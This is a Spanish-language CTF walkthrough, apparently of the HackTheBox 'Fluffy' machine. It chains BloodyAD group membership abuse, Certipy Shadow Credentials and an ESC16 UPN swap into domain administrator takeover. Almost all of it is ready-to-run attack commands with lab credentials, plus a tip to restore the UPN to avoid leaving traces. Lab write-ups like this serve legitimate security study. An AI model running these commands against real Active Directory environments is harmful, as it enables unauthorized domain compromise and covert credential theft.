
---
Tags: #activeDirectory #privilegios #escalas #ES16 #certipy #bloodyAD

---
## **1. Preparación del entorno**

- Usuario inicial: `p.agila@fluffy.htb`
    
- Contraseña: `prometheusx-303`
    
- Objetivo:  escalar privilegios a `WINRM_SVC` y `CA_SVC`, luego administrador.
    
- Herramientas usadas:
    
    - `BloodyAD` → manipulación LDAP / AD
        
    - `Certipy` → explotación de ESC16 y Shadow Credentials
        
    - `Evil-WinRM` → acceso remoto vía WinRM
        

---

## **2. Exploración y descubrimiento de permisos**

**BloodyAD – detectar grupos y permisos write:**

`bloodyAD --host 10.10.11.69 -d fluffy.htb -u p.agila -p 'prometheusx-303' get writable`

- Permite ver **qué objetos (usuarios, grupos, OU) tu usuario puede modificar**.
    
- Útil para saber si puedes:
    
    - Añadir miembros a grupos (`add groupMember`)
        
    - Crear usuarios o modificar atributos
        

**Ejemplo de acción: añadir a tu usuario a un grupo privilegiado:**

`bloodyAD --host 10.10.11.69 -d dc01.fluffy.htb -u p.agila -p 'prometheusx-303' add groupMember 'SERVICE ACCOUNTS' p.agila`

- Resultado: `p.agila` ahora tiene permisos de **Service Accounts**, permitiendo **Shadow Credentials**.
    

---

## **3. Escalada usando Shadow Credentials (WinRM)**

**Generar Shadow Credentials para `WINRM_SVC`:**

`sudo certipy-ad shadow auto -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -account 'WINRM_SVC' -dc-ip '10.10.11.69'`

- Genera **certificado y key credential** para el usuario `WINRM_SVC`.
    
- Intenta autenticarse como `WINRM_SVC`.
    
- Problema frecuente: **Clock skew** → sincronizar hora con el DC:
    

`sudo timedatectl set-ntp true sudo ntpdate 10.10.11.69`

- Con el certificado correcto, obtienes el **NT hash de la cuenta** y puedes usarlo con:
    
    - `evil-winrm`
        
    - `psexec.py`
        

---

## **4. Exploración de la CA vulnerable (ESC16)**

**Comprobar CA vulnerable:**

`certipy find -username ca_svc -hashes :<NT_HASH> -dc-ip 10.10.11.69 -vulnerable`

- Busca:
    
    - Plantillas de certificado
        
    - Certificate Authorities (CA)
        
    - Permisos y vulnerabilidades (ESC16)
        
- Resultado relevante: CA `fluffy-DC01-CA` con **ESC16** → vulnerable a escalada mediante Shadow Credentials.
    

---

## **5. Explotación ESC16 para escalar a administrador**

**Pasos principales:**

1. **Leer atributos de la cuenta víctima (`ca_svc`):**
    

`certipy account -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -dc-ip 10.10.11.69 -user 'ca_svc' read`

2. **Modificar temporalmente UPN de la víctima al del administrador:**
    

`certipy account -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -dc-ip 10.10.11.69 -upn 'administrator' -user 'ca_svc' update`

3. **Generar Shadow Credentials con Certipy:**
    

`certipy shadow -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -dc-ip 10.10.11.69 -account 'ca_svc' auto`

- Obtienes **TGT y NT hash** del administrador.
    

4. **Exportar caché Kerberos:**
    

`export KRB5CCNAME=ca_svc.ccache`

5. **Solicitar certificado como administrador:**
    

`certipy req -k -dc-ip '10.10.11.69' -target 'DC01.FLUFFY.HTB' -ca 'fluffy-DC01-CA' -template 'User'`

- Resultado: `administrator.pfx` → certificado administrador.
    

6. **Restaurar UPN de la víctima:**
    

`certipy account -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -dc-ip '10.10.11.69' -upn 'ca_svc@fluffy.htb' -user 'ca_svc' update`

7. **Autenticarse como administrador con Certipy:**
    

`certipy auth -dc-ip '10.10.11.69' -pfx 'administrator.pfx' -username 'administrator' -domain 'fluffy.htb'`

- Obtienes **TGT y NT hash del administrador** → control total del dominio.
    

---

## **6. Notas importantes**

- **BloodyAD** → para detectar **escrituras permisibles** en AD y manipular grupos o usuarios.
    
- **Certipy** → explotación de **ESC16** usando Shadow Credentials.
    
- **Clock skew** → la hora del atacante debe estar sincronizada con el DC para Kerberos.
    
- **Cuidado con UPN temporal** → siempre restaurar para no dejar rastro.